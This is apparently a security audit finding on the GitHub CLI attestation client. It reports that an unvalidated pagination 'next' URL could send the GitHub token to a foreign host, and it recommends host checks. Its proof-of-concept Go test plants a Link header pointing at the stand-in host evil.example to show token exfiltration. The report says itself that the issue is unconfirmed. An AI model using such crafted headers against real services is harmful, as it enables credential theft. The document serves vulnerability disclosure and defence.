### Title
Pagination `next` URL from attestations API is used unvalidated with the authenticated GitHub client, allowing wrong-host token exfiltration - ([File: pkg/cmd/attestation/api/client.go])

### Summary
`getAttestations` blindly trusts the server-supplied `next` pagination URL returned by `RESTWithNext` and reuses it as the request path on the next authenticated call, without validating that it points back to `c.host`. This is in sharp contrast to how the same file handles the analogous `BundleURL` field, which is deliberately routed through a separate, unauthenticated `externalHttpClient` specifically to avoid sending the GitHub token to attacker/third‑party controlled URLs.

### Finding Description
In `LiveClient.getAttestations` [1](#0-0) , the loop calls:

```go
newURL, restErr := c.githubAPI.RESTWithNext(c.host, http.MethodGet, pageURL.String(), nil, &resp)
...
pageURL = safeurl.NewImmutableSafeURL(newURL)
```

`newURL` is the `Link: <...>; rel="next"` header value parsed straight out of the HTTP response in `Client.RESTWithNext` [2](#0-1) , with no check that it belongs to `c.host` or even that it is a relative path. `safeurl.NewImmutableSafeURL` is used here purely as an opaque string wrapper for an already-fully-formed URL (unlike `safeurl.JoinPath`, used in `buildRequestURL`, which constructs URLs against a known/allowed base) — it performs no host allow-listing on this call site.

On the following loop iteration, `pageURL.String()` (potentially an absolute, attacker-controlled URL, e.g. `https://evil.example/...`) is passed as the `p` argument to `RESTWithNext(c.host, http.MethodGet, pageURL.String(), ...)`. Whether the underlying `go-gh` REST client (`ghAPI.NewRESTClient`) actually dispatches the request to that absolute URL instead of `c.host` — and, separately, whether the token-injecting `http.Client`/`RoundTripper` supplied to `NewLiveClient` verifies the destination host before attaching the `Authorization` header — are both determined by code outside this repository's traced logic (the vendored `go-gh` REST client internals and the caller-supplied `hc *http.Client`'s transport, neither of which could be located/verified in this codebase during this review).

Notably, the same file shows the authors were aware of exactly this class of risk: for `Attestation.BundleURL` (also server-supplied), `fetchBundleFromAttestations`/`getBundle` deliberately avoid the authenticated `githubAPI` client and instead fetch via `c.externalHttpClient.Get(url.String())` [3](#0-2) , [4](#0-3) . No equivalent isolation or host validation exists for the pagination `next` URL.

### Impact Explanation
If the underlying REST transport honors an absolute URL in `p` over the configured `Host` option (or the token-attaching transport does not verify request host), a malicious/compromised GHES host or GitHub-compatible host the victim is authenticated against could return a crafted `Link: <https://evil.example/...>; rel="next"` header on an attestations listing response, causing the victim's `c.host` credentials to be sent to `evil.example` on the subsequent page fetch. This would match GitHub's "authenticated request to attacker-controlled host / credential disclosure" bounty impact class. This could not be conclusively confirmed against the vendored `go-gh` client or the token-transport wiring within this codebase snapshot.

### Likelihood Explanation
Preconditions require the victim to run `gh attestation` commands against a host that returns attacker-influenced pagination `Link` headers (a malicious/compromised GHES instance or an MITM-controlled response on a host the victim already trusts), which fits the stated threat model of "attacker controls an alternate GitHub-compatible host or GHES instance the victim is authenticated against." No local access or token leakage is required from the attacker's side. Exploitability, however, hinges on the internal behavior of the `go-gh` REST client and the auth-transport construction, both unverified here.

### Recommendation
Validate the `next` URL returned from `RESTWithNext`/`Link` header against `c.host` (scheme+authority) before using it in a subsequent authenticated call, rejecting or stripping it to a path-only value if it points elsewhere — mirroring the pattern already used for `BundleURL`, i.e., use an unauthenticated client (or reject cross-host URLs) for any server-supplied absolute URL, and add a host-equality assertion in `getAttestations`'s loop before calling `RESTWithNext` again.

### Proof of Concept
```go
// pkg/cmd/attestation/api/client_test.go
func TestGetAttestations_NextPageCrossHost(t *testing.T) {
    reg := &httpmock.Registry{}
    defer reg.Verify(t)

    reg.Register(
        httpmock.REST("GET", "repos/github/example/attestations/sha256:12313213"),
        httpmock.WithHeader(
            httpmock.StringResponse(`{"attestations":[]}`),
            "Link",
            `<https://evil.example/repos/github/example/attestations/sha256:12313213?page=2>; rel="next"`,
        ),
    )
    // No stub registered for evil.example — if the real HTTP client (built with
    // c.host's Authorization-injecting transport) ever issues a request whose
    // Host is evil.example, assert that (a) it never happens (registry has no
    // match and test must not silently pass), and (b) if it does, capture the
    // outgoing request's Authorization header to prove token leakage.

    httpClient := &http.Client{Transport: reg}
    c := NewLiveClient(httpClient, &http.Client{}, "github.com", io.NewTestHandler())

    _, err := c.GetByDigest(FetchParams{
        Digest: "sha256:12313213", Limit: 30, Repo: "github/example",
    })
    require.Error(t, err) // expect failure/no dispatch to evil.example, not silent success
}
```
Expected assertion: the registry never observes a request to `evil.example`, and no `Authorization` header configured for `github.com` is ever attached to a request whose `Host` differs from `github.com`. If such a request is observed carrying the token, the finding is confirmed.
